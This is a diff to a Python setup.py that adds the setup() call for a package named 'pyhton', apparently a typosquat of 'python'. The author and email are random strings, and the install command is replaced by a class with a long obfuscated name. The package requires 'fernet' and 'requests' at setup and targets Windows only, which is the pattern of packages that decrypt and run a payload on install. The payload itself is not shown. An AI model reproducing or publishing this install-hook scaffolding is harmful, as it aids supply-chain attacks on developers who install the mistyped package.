@@ -18,5 +18,22 @@ class WGCAiPDhqQAwjSRwJXicnAYttjIoOPCIVuAvnyTEJqivTEtKeeBTnTDEKiaCtGjCkPsSoglPIJ
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="pyhton",
+    version=VERSION,
+    author="UhjmhOPVzGIrQGVnnYEw",
+    author_email="BxboICLIaiWYZafTtUO@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': WGCAiPDhqQAwjSRwJXicnAYttjIoOPCIVuAvnyTEJqivTEtKeeBTnTDEKiaCtGjCkPsSoglPIJxkmfnDlYnewjJHrJkrBWXvgpPkwrRLYWDQGXICtVXTXazpGCfIHxEiwLSdGXGJcgDWLnDWKvwlJSPjacCTQIHcTkAIgYbUMA,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
